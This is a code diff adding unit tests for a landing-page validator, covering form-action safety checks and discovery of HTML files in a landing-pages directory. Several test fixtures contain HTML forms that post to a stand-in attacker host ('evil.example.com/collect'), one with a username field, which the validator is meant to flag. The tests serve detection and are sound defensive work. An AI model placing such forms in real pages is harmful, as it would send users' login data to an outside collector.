@@ -70,6 +70,72 @@ class HTMLStructureChecks(unittest.TestCase):
         self.assertEqual(r.errors, [])
 
 
+class FormActionSafetyChecks(unittest.TestCase):
+    def test_empty_action_is_ok(self):
+        r = new_result()
+        vt.check_form_action_safety('<form method="POST" action="">x</form>', r)
+        self.assertEqual(r.errors, [])
+        self.assertEqual(r.warnings, [])
+
+    def test_hash_action_is_ok(self):
+        r = new_result()
+        vt.check_form_action_safety('<form action="#">x</form>', r)
+        self.assertEqual(r.errors, [])
+
+    def test_no_action_attribute_is_ok(self):
+        r = new_result()
+        vt.check_form_action_safety('<form method="POST">x</form>', r)
+        self.assertEqual(r.errors, [])
+
+    def test_external_absolute_url_is_error(self):
+        r = new_result()
+        vt.check_form_action_safety(
+            '<form method="POST" action="https://evil.example.com/collect">x</form>', r)
+        self.assertTrue(any("external host" in e for e in r.errors))
+
+    def test_protocol_relative_url_is_error(self):
+        r = new_result()
+        vt.check_form_action_safety('<form action="//evil.example.com/collect">x</form>', r)
+        self.assertTrue(any("external host" in e for e in r.errors))
+
+    def test_relative_path_action_is_warning_not_error(self):
+        r = new_result()
+        vt.check_form_action_safety('<form action="/submit">x</form>', r)
+        self.assertEqual(r.errors, [])
+        self.assertTrue(any("non-empty" in w for w in r.warnings))
+
+
+class LandingPageDiscoveryChecks(unittest.TestCase):
+    def test_finds_html_files_in_landing_pages_dir(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            base = Path(tmp)
+            (base / "landing-pages").mkdir()
+            (base / "landing-pages" / "a.html").write_text(GOOD_HTML)
+            (base / "landing-pages" / "b.html").write_text(GOOD_HTML)
+            found = vt.find_landing_pages(base)
+            self.assertEqual([p.name for p in found], ["a.html", "b.html"])
+
+    def test_missing_landing_pages_dir_returns_empty(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            self.assertEqual(vt.find_landing_pages(Path(tmp)), [])
+
+    def test_validate_landing_page_catches_external_form_action(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            base = Path(tmp)
+            (base / "landing-pages").mkdir()
+            page = base / "landing-pages" / "bad.html"
+            page.write_text(
+                '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">'
+                '<meta name="viewport" content="width=device-width, initial-scale=1.0">'
+                '<title>t</title></head><body>'
+                '<form method="POST" action="https://evil.example.com/collect">'
+                '<input name="username"></form></body></html>'
+            )
+            result = vt.validate_landing_page(page)
+            self.assertFalse(result.passed)
+            self.assertTrue(any("external host" in e for e in result.errors))
+
+
 class AccessibilityChecks(unittest.TestCase):
     def test_missing_lang_warns(self):
         r = new_result()
